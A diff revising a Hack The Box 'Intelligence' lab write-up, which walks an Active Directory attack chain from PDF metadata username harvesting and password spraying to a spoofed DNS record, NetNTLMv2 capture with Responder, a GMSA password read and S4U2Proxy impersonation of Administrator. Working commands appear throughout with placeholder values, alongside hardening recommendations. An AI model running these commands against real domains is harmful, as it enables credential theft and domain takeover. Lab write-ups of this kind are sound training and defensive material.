@@ -1,5 +1,5 @@
 ---
-title: "Intelligence — PDF Metadata Enumeration, DNS Injection, and GMSA Silver Ticket"
+title: "Intelligence — PDF Metadata to GMSA Silver Ticket via DNS Injection"
 description: "PDF metadata and a default onboarding password enable DNS record injection and NTLM capture, then GMSA silver-ticket abuse reaches Domain Administrator."
 type: case-study
 platform: Hack The Box
@@ -14,53 +14,66 @@ tags:
   - ntlm-capture
   - gmsa
   - silver-ticket
+objective: "Escalate from unauthenticated web content enumeration to Domain Administrator through DNS injection and GMSA constrained-delegation abuse."
+tools:
+  - nmap
+  - exiftool
+  - kerbrute
+  - NetExec
+  - smbclient
+  - dnstool
+  - Responder
+  - hashcat
+  - BloodHound
+  - bloodyAD
+  - Impacket
+skill: "Active Directory attack-path analysis from information disclosure to delegated service-account abuse"
+outcome: "Domain Administrator command execution as `nt authority\\system` on the domain controller"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Active Directory domain controller (IIS web server, DNS, SMB) |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from unauthenticated web content enumeration to Domain Administrator through DNS injection and GMSA constrained-delegation abuse |
+| Outcome | Domain Administrator command execution as `nt authority\system` on the domain controller |
 
 ## Summary
 
-Intelligence is a Medium-rated Hack The Box Windows Active Directory lab where downloadable PDF documents on an IIS web server expose author metadata enumerating valid domain users, and one document discloses a default onboarding password. An SMB share accessible with those credentials contains a PowerShell script that authenticates to any internal hostname beginning with `web` — exploited by registering a spoofed DNS record and capturing a NetNTLMv2 hash via Responder. The captured hash is cracked to access a higher-privileged user who has `ReadGMSAPassword` rights on a Group Managed Service Account. The GMSA's NTLM hash, combined with its constrained delegation rights, enables a silver ticket attack to impersonate the Administrator. All target addresses, credentials, and hashes are redacted below; command patterns are preserved.
+Intelligence is a Medium-rated Hack The Box Windows Active Directory lab whose path begins with information disclosure rather than a software flaw: PDF documents on an IIS web server expose author metadata that enumerates valid domain users, and one document discloses a default onboarding password. An SMB share reachable with those credentials holds a PowerShell script that authenticates to any internal hostname beginning with `web`, which is abused by registering a spoofed DNS record and capturing a NetNTLMv2 authentication with Responder. Cracking that hash yields a higher-privileged user with `ReadGMSAPassword` rights over a Group Managed Service Account; the GMSA's NTLM hash, combined with its constrained delegation rights, allows a service ticket to be requested that impersonates the Administrator. Target and attacker addresses, accounts, and credential values are replaced with role-based placeholders throughout; command patterns are preserved.
+
+**Attack path:** **PDF metadata enumeration → default onboarding password → authenticated SMB access → `downdetector.ps1` analysis → spoofed DNS record → NetNTLMv2 capture and crack → BloodHound enumeration → GMSA password read → service ticket via S4U2Proxy → Domain Administrator**
 
 ## Context and Objective
 
-- **Target:** Windows Active Directory Domain Controller (Medium difficulty)
-- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445)
-- **Objective:** Achieve Domain Administrator privileges through the attack surface presented by exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Active Directory domain controller hosting an IIS web application, DNS, Kerberos, LDAP, and SMB.
+- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from unauthenticated enumeration of web content to domain administrative control, demonstrating how information disclosure and a legitimate automation script combine into a full compromise.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### 1. Port Scanning and Service Discovery
+### 1. Service Enumeration
 
-Observation: standard AD services are exposed. The domain is `<TARGET_DOMAIN>` with DC at `<DOMAIN_CONTROLLER_HOST>`.
-
-Action: run a standard Nmap scan to enumerate open ports and service versions.
+Observation: a service/version scan exposes the standard Active Directory footprint of the domain controller, including an IIS web server.
 
 ```bash
 nmap -sC -sV -oA nmap/intelligence <TARGET_IP>
 ```
 
-Representative excerpt (truncated):
+Significance: the fingerprint confirms an AD domain controller with DNS, Kerberos, LDAP, SMB, and an IIS web server, defining the domain (`<TARGET_DOMAIN>`) and domain controller host (`<DOMAIN_CONTROLLER_HOST>`).
 
-```text
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
-445/tcp   open  microsoft-ds
-```
-
-Technical significance: the service fingerprint confirms an AD DC with DNS, Kerberos, LDAP, SMB, and an IIS web server.
-
-Result: the recorded output shows AD DC services including DNS, Kerberos, LDAP, SMB, and IIS.
+Result: the reachable services are enumerated and the web server is identified as the first unauthenticated attack surface.
 
 ### 2. PDF Metadata Enumeration
 
-Observation: the IIS web server hosts downloadable PDF documents with a naming pattern of `YYYY-MM-DD-upload.pdf`. A date-range script discovers approximately 84 PDFs. Extracting `Creator`/`Author` metadata yields around 30 unique usernames. All are valid domain accounts confirmed via Kerberos user enumeration.
+Observation: the IIS web server hosts downloadable PDF documents following the naming pattern `YYYY-MM-DD-upload.pdf`; a date-range sweep discovers approximately 84 documents, and extracting their author metadata yields around 30 unique usernames.
 
-Action: write a script to enumerate all possible dates across a realistic range and download matching PDFs.
+Action: enumerate all possible dates across a realistic range and download matching PDFs.
 
 ```python
 import requests
@@ -70,7 +83,6 @@ base = "http://<TARGET_IP>/documents/{date}-upload.pdf"
 start = date(2020, 1, 1)
 end   = date(2021, 12, 31)
 
-found = []
 d = start
 while d <= end:
     url = base.format(date=d.strftime("%Y-%m-%d"))
@@ -78,72 +90,64 @@ while d <= end:
     if r.status_code == 200:
         with open(d.strftime("%Y-%m-%d") + ".pdf", "wb") as f:
             f.write(r.content)
-        found.append(url)
         print(f"[+] {url}")
     d += timedelta(days=1)
 ```
 
-Action: extract author metadata from all downloaded PDFs.
+Action: extract author metadata from the downloaded documents, then validate the discovered usernames against the domain via Kerberos user enumeration.
 
 ```bash
 for pdf in *.pdf; do
     exiftool "$pdf" | grep "Creator\|Author" | awk '{print $NF}'
 done | sort -u > users.txt
-```
-
-Action: validate discovered usernames against the domain via Kerberos user enumeration.
-
-```bash
 kerbrute userenum --dc <TARGET_IP> -d <TARGET_DOMAIN> users.txt
 ```
 
-Technical significance: PDF author metadata is a real-world information leakage vector. Organizations that publish documents without stripping metadata expose valid internal usernames. These usernames enable targeted password spraying without generating failed-login noise.
+Significance: author metadata is an information-leakage vector — documents published without stripped metadata expose valid internal usernames, which enable targeted authentication attempts without noisy, invalid-name guessing.
 
-Result: the notes report approximately 30 valid domain accounts discovered from PDF metadata.
+Result: approximately 30 unique usernames are recovered from PDF metadata and confirmed as valid domain accounts through Kerberos user enumeration.
 
 ### 3. Default Password Discovery and Initial Access
 
-Observation: one PDF (`2020-06-04-upload.pdf`) contains a default onboarding password in plain text. This password is valid for a domain user, providing initial SMB access.
+Observation: one PDF (`2020-06-04-upload.pdf`) contains an onboarding document with a default password in plain text.
 
-Action: read the PDF to extract the default password, then spray it across discovered usernames.
+Action: spray the disclosed default password across the discovered usernames.
 
 ```bash
 nxc smb <TARGET_IP> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
 ```
 
-Representative excerpt (values generalized):
+Truncated spray output:
 
 ```text
-[+] <TARGET_DOMAIN>\<USER>:<DEFAULT_PASSWORD>
+[+] <TARGET_DOMAIN>\<LAB_USER>:<DEFAULT_PASSWORD>
 ```
 
-Technical significance: default passwords in published documents are a common misconfiguration. The onboarding document was accessible to anyone who could download PDFs from the web server, combining username enumeration (from metadata) with a usable password (from content) into direct domain access.
+Significance: a published onboarding document made a usable credential accessible to anyone who could download PDFs, and the metadata-derived username list converted it into authenticated domain access.
 
-Result: the notes report valid domain credentials obtained via default password spray (values redacted).
+Result: valid domain credentials are recovered for `<LAB_USER>` and authentication succeeds over SMB.
 
 ### 4. SMB Enumeration and PowerShell Script Discovery
 
-Observation: authenticated SMB access reveals two readable shares: `IT` and `Users`. The `IT` share contains a PowerShell script (`downdetector.ps1`) that queries Active Directory for DNS records whose names start with `web`, then makes an authenticated HTTP request to each one using the running account's credentials (`-UseDefaultCredentials`).
+Observation: authenticated SMB access exposes two readable shares, `IT` and `Users`, and the `IT` share contains a PowerShell script, `downdetector.ps1`.
 
-Action: enumerate shares and retrieve the PowerShell script.
+Action: enumerate shares and retrieve the script.
 
 ```bash
-nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --shares
+nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<DEFAULT_PASSWORD>' --shares
+smbclient //<TARGET_IP>/IT -U '<LAB_USER>%<DEFAULT_PASSWORD>' -c 'recurse ON; prompt OFF; mget *'
 ```
+
+Share listing:
 
 ```text
 Share           Permissions    Remark
 -----           -----------    ------
 IT              READ
 Users           READ
-IPC$            READ           Remote IPC
 ```
 
-```bash
-smbclient //<TARGET_IP>/IT -U '<USER>%<PASSWORD>' -c 'recurse ON; prompt OFF; mget *'
-```
-
-The retrieved script (`downdetector.ps1`) contains:
+The retrieved script contains:
 
 ```powershell
 Import-Module ActiveDirectory
@@ -160,18 +164,18 @@ foreach($record in Get-ChildItem "AD:DC=<TARGET_DOMAIN_COMPONENT>" -Filter * |
 }
 ```
 
-Technical significance: `-UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts. The script runs periodically via Scheduled Task. Any DNS record matching `web*` will trigger an authenticated HTTP request to that host, regardless of whether the record points to a legitimate server.
+Significance: `-UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts, and the script likely runs periodically via a Scheduled Task. Any DNS record matching `web*` triggers an authenticated HTTP request to that host, regardless of whether it points to a legitimate server.
 
-Result: the notes report the `downdetector.ps1` script discovered with NTLM credential-passing behavior (usernames generalized).
+Result: a script that forwards integrated credentials to attacker-selectable hostnames is identified as the path from the low-privileged account to a higher-privileged one.
 
-### 5. DNS Record Injection and NTLM Capture
+### 5. DNS Record Injection and NetNTLMv2 Capture
 
-Observation: the PowerShell script authenticates to any hostname matching `web*`. Registering a DNS A record named `<SPOOFED_WEB_HOST>` pointing to the attack machine causes the script to send NTLM credentials to the attacker when it next runs (~5 minutes).
+Observation: because the script authenticates to any hostname matching `web*`, a DNS A record named `<SPOOFED_WEB_HOST>` pointing to the attack host redirects the script's next authenticated request to the attacker.
 
-Action: add a spoofed DNS record using Krbrelayx's `dnstool.py`.
+Action: add the spoofed record through Krbrelayx's `dnstool.py` using authenticated DNS updates.
 
 ```bash
-python3 dnstool.py -u '<TARGET_DOMAIN>\<USER>' -p '<PASSWORD>' \
+python3 dnstool.py -u '<TARGET_DOMAIN>\<LAB_USER>' -p '<DEFAULT_PASSWORD>' \
   -r <SPOOFED_WEB_HOST> -d <ATTACKER_IP> --action add <TARGET_IP>
 ```
 
@@ -179,49 +183,40 @@ python3 dnstool.py -u '<TARGET_DOMAIN>\<USER>' -p '<PASSWORD>' \
 [+] <SPOOFED_WEB_HOST> has been successfully added
 ```
 
-Action: start Responder to capture the NTLM authentication.
+Action: start Responder to capture the authentication, then crack the captured hash.
 
 ```bash
 sudo responder -I tun0 -v
+hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
 ```
 
-Action: wait for the scheduled script to execute.
-
-Representative excerpt (hash redacted):
+Truncated capture output (hash redacted):
 
 ```text
 [HTTP] NTLMv2 Hash     : <SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:<CHALLENGE>:...
 ```
 
-Action: crack the captured hash with a wordlist.
-
-```bash
-hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
-```
+Truncated crack output:
 
 ```text
 <SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:...:<CRACKED_PASSWORD>
 ```
 
-Technical significance: this attack works because the script uses `-UseDefaultCredentials` without validating the target hostname against an allowlist. The Scheduled Task provides periodic trigger. DNS injection via authenticated LDAP writes is not prevented by Secure Dynamic Updates alone — the attack uses legitimate domain credentials to create the record directly.
+Significance: the script trusts DNS without validating the target hostname against an allowlist, so a legitimate authenticated DNS write is enough to steer its credentials to an attacker. Secure Dynamic Updates alone do not prevent this, because the record is created with legitimate domain credentials via an authenticated LDAP write.
 
-Result: the notes report a NetNTLMv2 hash captured and cracked, yielding domain credentials (values redacted).
+Result: a NetNTLMv2 authentication for `<SERVICE_ACCOUNT>` is captured and cracked, yielding credentials for a higher-privileged account.
 
-### 6. BloodHound Enumeration and GMSA Password Read
+### 6. GMSA Password Read
 
-Observation: BloodHound analysis with the cracked credentials reveals the account is a member of `<SUPPORT_GROUP>`, which has `ReadGMSAPassword` rights on a Group Managed Service Account (`<GMSA_ACCOUNT>`). The GMSA has constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`.
+Observation: with the cracked credentials, BloodHound reveals that `<SERVICE_ACCOUNT>` is a member of `<SUPPORT_GROUP>`, which holds `ReadGMSAPassword` over the Group Managed Service Account `<GMSA_ACCOUNT>`, and that `<GMSA_ACCOUNT>` has constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`.
 
-Action: collect BloodHound data and enumerate GMSA details.
+Action: collect BloodHound data and read the GMSA password attribute.
 
 ```bash
 bloodhound-ce-python -d <TARGET_DOMAIN> \
   -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
   -c all -ns <TARGET_IP>
-```
 
-Action: read the GMSA password attribute.
-
-```bash
 bloodyAD --host <TARGET_IP> -d <TARGET_DOMAIN> \
   -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
   get search \
@@ -229,88 +224,78 @@ bloodyAD --host <TARGET_IP> -d <TARGET_DOMAIN> \
   --attr msDS-ManagedPassword
 ```
 
-Representative excerpt (hash redacted):
+Truncated attribute output (hash redacted):
 
 ```text
-msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:<GMSA_NTLM_HASH>
+msDS-ManagedPassword.NTLM: <LM_HASH_EMPTY>:<GMSA_NTLM_HASH>
 ```
 
-Technical significance: Group Managed Service Accounts (gMSAs) have their passwords managed automatically by AD, stored in the `msDS-ManagedPassword` attribute. Principals granted explicit `ReadGMSAPassword` rights can retrieve the current NTLM hash. The password is a 256-byte random value changed every 30 days, but the hash is sufficient for NTLM-based authentication and ticket operations.
+Significance: a gMSA's password is managed automatically by Active Directory and stored in the readable `msDS-ManagedPassword` attribute, so any principal granted explicit `ReadGMSAPassword` rights can retrieve the current NTLM hash. The underlying password is a 256-byte random value rotated every 30 days, but the hash alone is sufficient for NTLM-based authentication and ticket operations.
 
-Result: the notes report the GMSA NTLM hash retrieved (hash redacted).
+Result: the NTLM hash of `<GMSA_ACCOUNT>` is retrieved through the group's delegated read right.
 
-### 7. Silver Ticket via Constrained Delegation
+### 7. Domain Administrator via S4U2Proxy
 
-Observation: the GMSA (`<GMSA_ACCOUNT>`) has constrained delegation rights to `WWW/<DOMAIN_CONTROLLER_HOST>`. With the GMSA's NTLM hash, `impacket-getST` can request a service ticket for the `WWW` service on the DC, impersonating the Administrator via S4U2Proxy. The resulting ccache file enables Kerberos-authenticated access as Administrator.
+Observation: with `<GMSA_ACCOUNT>`'s NTLM hash and its constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`, a service ticket can be requested for the `WWW` service on the domain controller while impersonating the Administrator.
 
-Action: request a service ticket impersonating Administrator using the GMSA hash.
+Action: request the service ticket, then use the resulting ccache to authenticate.
 
 ```bash
 impacket-getST '<TARGET_DOMAIN>/<GMSA_ACCOUNT>' \
   -spn WWW/<DOMAIN_CONTROLLER_HOST> \
-  -hashes aad3b435b51404eeaad3b435b51404ee:<GMSA_NTLM_HASH> \
+  -hashes <LM_HASH_EMPTY>:<GMSA_NTLM_HASH> \
   -impersonate administrator
-```
 
-```text
-[*] Saving ticket in administrator.ccache
-```
-
-Action: use the ccache to authenticate as Administrator.
-
-```bash
 export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass <TARGET_DOMAIN>/administrator@<DOMAIN_CONTROLLER_HOST>
 ```
 
+Truncated output:
+
 ```text
+[*] Saving ticket in administrator.ccache
 C:\Windows\system32> whoami
 nt authority\system
 ```
 
-Technical significance: constrained delegation with protocol transition (S4U2Proxy) allows a service to obtain tickets on behalf of any user to the constrained SPN. With the GMSA's NTLM hash, an attacker can forge the TGS-REQ without needing the user's password. The silver ticket grants access only to the specific SPN, but since the SPN is on the DC itself, this provides full Domain Administrator access.
+Significance: constrained delegation with protocol transition (S4U2Proxy) lets a service obtain tickets on behalf of any user to its allowed SPN without the user's password. The resulting ticket is scoped to that single SPN, but because the SPN is a service on the domain controller, it yields administrative execution on the DC itself.
 
-Result: the notes report full administrative access obtained on the Domain Controller.
+Result: the impersonated ticket returns a shell executing as `nt authority\system`, establishing Domain Administrator control.
 
 ## Challenges and Decisions
 
-| Challenge | Decision | Rationale |
-|---|---|---|
-| PDF naming pattern unknown | Brute-forced date range `2020-01-01` to `2021-12-31` | Document naming followed `YYYY-MM-DD-upload.pdf`; systematic date enumeration recovered all accessible documents |
-| DNS injection requires authenticated writes | Used discovered domain credentials | Secure Dynamic Updates alone do not prevent authenticated LDAP writes to the DNS partition |
-| Scheduled Task trigger timing unknown | Waited ~5 minutes after DNS record creation | Script periodicity was unknown; patience allowed the legitimate trigger to fire |
-| GMSA hash alone insufficient for direct login | Used constrained delegation via S4U2Proxy | GMSA accounts cannot be used for interactive login; silver ticket via delegation provides the needed SPN access |
+- **Unknown document naming pattern.** Manual inspection established the `YYYY-MM-DD-upload.pdf` convention, so a date-range sweep was chosen over wordlist guessing; it systematically recovered the accessible documents. *Documented rationale: the naming pattern made exhaustive date enumeration reliable.*
+- **DNS injection needs authenticated writes.** The spoofed record was created with the already-recovered domain credentials; Secure Dynamic Updates alone do not block this because the attack performs an authenticated LDAP write rather than an unauthenticated dynamic update. *Documented rationale: legitimate credentials satisfy DNS update permissions.*
+- **Unknown Scheduled Task timing.** The script's periodicity was unknown, so a wait of roughly five minutes was used before expecting the DNS-triggered request to fire. *Documented rationale: patience lets the legitimate trigger fire on its own schedule.*
 
 ## Outcome
 
-The evidence establishes: username enumeration via PDF metadata; credential recovery via default password in a published document; PowerShell script analysis revealing NTLM credential-passing behavior; DNS record injection triggering NTLM capture via Responder; hash cracking yielding higher-privileged credentials; GMSA password retrieval via `ReadGMSAPassword` rights; and silver ticket abuse via constrained delegation to achieve Domain Administrator. The attack chain is non-obvious from the initial port scan and requires creative enumeration of web content.
-
-**Attack chain:**
-PDF metadata enumeration → default password discovery → SMB share access → PowerShell script analysis → DNS record injection → NTLM hash capture → hash cracking → BloodHound enumeration → GMSA password read → silver ticket via constrained delegation → Domain Administrator
+The evidence establishes a complete path from unauthenticated enumeration to domain administrative execution, ending in a shell as `nt authority\system` on the domain controller. The pivot points were document content and a legitimate maintenance script rather than an exposed software vulnerability, and the static HTTP application was enumeration-only. No software exploit was required at any stage.
 
 ## Lessons and Recommendations
 
-Recommendations below follow the source remediation; none were re-tested during curation.
+Each finding below pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
 
-1. **Strip metadata from all publicly published documents.** PDF author, creator, and producer fields enumerate valid domain usernames. Use `mat2` or Microsoft's Document Inspector to remove metadata before publication. Implement DLP policies that flag outbound documents containing AD user information. (Recommendation.)
-
-2. **Restrict DNS record creation rights.** Standard domain users should not be able to create arbitrary DNS A records. Restrict DNS update permissions to dedicated service accounts and DNS administrators. Enabling Secure Dynamic Updates (already the default) is insufficient — the attack uses authenticated LDAP writes to the DNS partition directly. (Recommendation.)
-
-3. **Avoid NTLM credential passing in scheduled scripts.** `Invoke-WebRequest -UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts. Use API keys or tokens instead of Windows Integrated Authentication for external connectivity. If NTLM must be used, restrict outbound NTLM via the `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers` Group Policy setting. (Recommendation.)
-
-4. **Validate target hostnames in automation scripts.** Implement allowlists for DNS hostnames or IP ranges that automated scripts will contact. Prevent scripts from following DNS records that resolve to attacker-controlled infrastructure. (Recommendation.)
-
-5. **Audit GMSA delegation configurations.** Review `msDS-AllowedToDelegateTo` attributes on GMSA accounts. Constrained delegation to DC services (HTTP, LDAP, etc.) enables silver ticket attacks if the GMSA password is compromised. Remove delegation rights where not required. (Recommendation.)
-
-6. **Restrict `ReadGMSAPassword` rights.** Audit which principals have GMSA password read access. Limit to service accounts and administrators that genuinely require the credential. Broader groups (e.g., `<SUPPORT_GROUP>`) create unnecessary privilege escalation paths. (Recommendation.)
-
-Editorial MITRE view (mapping only, not a source claim): credential access via metadata and documents; credential capture via DNS injection and NTLM relay; privilege escalation via GMSA password read and constrained delegation abuse.
+1. **Unstripped document metadata (preventive, highest priority).** PDF author/creator fields exposed valid domain usernames that fed the credential spray. *Recommendation:* strip metadata from all publicly published documents before release (for example with `mat2` or the Microsoft Office Document Inspector) and add a pre-publication check for AD user identifiers.
+2. **Default credential published in a document (preventive).** An onboarding PDF disclosed a working default password, giving initial domain access. *Recommendation:* never embed shared default credentials in distributed documents; issue unique, one-time onboarding secrets and force a reset on first use. *Detection:* alert on a single password being attempted across many accounts.
+3. **DNS records trusted by automation (preventive/detective).** `downdetector.ps1` used `Invoke-WebRequest -UseDefaultCredentials`, forwarding the service account's NTLM credentials to any `web*` hostname. *Recommendation:* avoid Windows Integrated Authentication in scheduled scripts, allowlist the hostnames and address ranges they may contact, and, where NTLM must remain, restrict it via the `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers` policy. *Detection:* monitor for DNS records created by ordinary users and for outbound NTLM authentication from service accounts to unexpected hosts.
+4. **Over-broad DNS update rights (preventive).** Ordinary-domain-user credentials were sufficient to create an arbitrary A record. *Recommendation:* restrict DNS record creation to dedicated service accounts and DNS administrators rather than standard users. *Validation:* enumerate principals with write access on the DNS zone and confirm only intended identities remain.
+5. **Excessive GMSA exposure (preventive).** Broader group membership (`<SUPPORT_GROUP>`) granted `ReadGMSAPassword` over `<GMSA_ACCOUNT>`, whose constrained delegation reached a DC SPN. *Recommendation:* reduce `ReadGMSAPassword` grants to the minimum required and review `msDS-AllowedToDelegateTo` on service accounts so no delegation target grants administrative reach on a domain controller. *Validation:* audit GMSA password-read principals and delegation targets together, since the two combined produced full domain compromise.
 
 ## References
 
-- Hack The Box machine **[Intelligence](https://app.hackthebox.com/machines/Intelligence)** (retired lab; no active-instance detail)
-- Microsoft documentation: Group Managed Service Accounts
-- Microsoft documentation: Kerberos constrained delegation
-- Responder: LLMNR/NBT-NS/MDNS poisoner
-- Krbrelayx: Kerberos relaying toolkit
-- `impacket-getST`: Service ticket generation via S4U2Proxy
+- [Hack The Box — Intelligence](https://app.hackthebox.com/machines/Intelligence) (retired machine)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [ExifTool](https://exiftool.org/) (document metadata extraction)
+- [kerbrute](https://github.com/ropnop/kerbrute) (Kerberos user enumeration)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and credential checks)
+- [`smbclient` manual page (Samba)](https://samba.org/samba/docs/current/man-html/smbclient.1.html)
+- [krbrelayx — `dnstool.py`](https://github.com/dirkjanm/krbrelayx) (authenticated DNS record manipulation)
+- [Responder](https://github.com/lgandx/Responder) (rogue authentication server for NetNTLMv2 capture)
+- [Hashcat](https://hashcat.net/hashcat/) (NetNTLMv2 cracking, mode 5600)
+- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Active Directory attack-path analysis)
+- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (LDAP attribute reads, including `msDS-ManagedPassword`)
+- [Impacket — `getST.py`](https://github.com/fortra/impacket/blob/master/examples/getST.py) (S4U2Proxy service-ticket requests)
+- [Group Managed Service Accounts overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
+- [Kerberos constrained delegation overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-outgoing-ntlm-traffic-to-remote-servers)
